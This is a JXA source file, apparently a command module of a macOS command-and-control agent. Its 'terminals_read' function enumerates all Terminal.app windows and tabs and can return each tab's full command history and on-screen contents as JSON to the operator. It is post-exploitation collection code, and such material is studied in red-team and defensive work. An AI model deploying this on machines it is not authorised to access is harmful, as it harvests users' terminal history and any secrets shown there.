exports.terminals_read = function(task, command, params){
    let split_params = {};
    try{
        split_params = JSON.parse(params);
    }catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
    let history = false;
    let contents = false;
    if(split_params['history']){
        history = true;
    }
    if(split_params['contents']){
        contents = true;
    }
	let all_data = {};
	try{
		let term = Application("Terminal");
		if(term.running()){
            let windows = term.windows;
            for(let i = 0; i < windows.length; i++){
                let win_info = {
                    "Name": windows[i].name(),
                    "Visible": windows[i].visible(),
                    "Frontmost": windows[i].frontmost()
                };
                let all_tabs = [];
                // store the windows information in id_win in all_data
                all_data["window_" + i] = win_info;
                for(let j = 0; j < windows[i].tabs.length; j++){
                    let tab_info = {
                        "Win/Tab": + i + "/" + j,
                        "Busy": windows[i].tabs[j].busy(),
                        "Processes": windows[i].tabs[j].processes(),
                        "Selected": windows[i].tabs[j].selected(),
                        "TTY": windows[i].tabs[j].tty()
                    };
                    if(windows[i].tabs[j].titleDisplaysCustomTitle()){
                        tab_info["CustomTitle"] =  windows[i].tabs[j].customTitle();
                    }
                    if(history){
                        tab_info["History"] = windows[i].tabs[j].history();
                    }
                    if(contents){
                        tab_info["Contents"] = windows[i].tabs[j].contents();
                    }
                    all_tabs.push(tab_info);
                }
                // store all of the tab information corresponding to that window id at id_tabs
                all_data[i + "_tabs"] = all_tabs;
            }
        }else{
            return JSON.stringify({"user_output":"Terminal is not running", "completed": true, "status": "error"});
        }

	}catch(error){
	    return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
	}
	let output = JSON.stringify(all_data, null, 2);
	return JSON.stringify({"user_output":output, "completed": true});
};
COMMAND_ENDS_HERE